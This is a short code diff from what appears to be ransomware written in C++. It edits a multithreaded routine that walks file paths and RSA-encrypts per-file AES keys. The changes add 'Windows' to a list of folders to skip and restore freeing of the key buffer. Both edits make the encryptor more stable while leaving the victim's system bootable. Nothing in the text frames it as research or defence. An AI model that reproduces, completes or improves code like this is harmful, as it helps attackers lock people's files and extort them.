@@ -172,9 +172,6 @@ void do_encryption() {
 	atomic<int> doneProdEnc(0);
 	atomic<int> doneConsEnc(0);
 
-
-
-
 	RSACrypto rsa = RSACrypto();	// Not thread safe
 
 	/* Start path producer thread and fill queue */
@@ -324,6 +321,7 @@ set<wstring>* get_ignore_folders() {
 	ignore_folders->insert(L"OpenSSL");
 	ignore_folders->insert(L"Perl");
 	ignore_folders->insert(L"$");
+	ignore_folders->insert(L"Windows");
 
 	return ignore_folders;
 }
@@ -466,8 +464,8 @@ void enc_key_consumer_thread(enc_k_consumer_bundle& k_bundle) {
 			rsa.encrypt_key(path, aes_key_and_tag, 32+16);
 
 			/* Clean up */
-			//delete aes_key_and_tag;
-			//aes_key_and_tag = NULL;
+			delete aes_key_and_tag;
+			aes_key_and_tag = NULL;
 		}
 	} while (items_left || k_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == k_consumer_count);
 
